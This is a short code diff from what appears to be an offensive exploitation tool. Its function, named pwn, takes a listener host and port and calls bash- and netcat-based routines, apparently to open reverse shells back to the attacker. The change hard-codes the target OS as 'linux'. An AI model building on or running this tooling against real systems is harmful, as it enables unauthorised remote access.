@@ -15,10 +15,9 @@ def pwn(exploit):
     
     ip = args.lhost
     port = args.lport
-    
     method = exploit['ATTACK_METHOD']
-
     if(method == "INPUT"):
+        exploit['OS'] = "linux"
         if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "INPUT", ip, port)): return
             if(exploit_nc(exploit, "INPUT", ip, port)): return
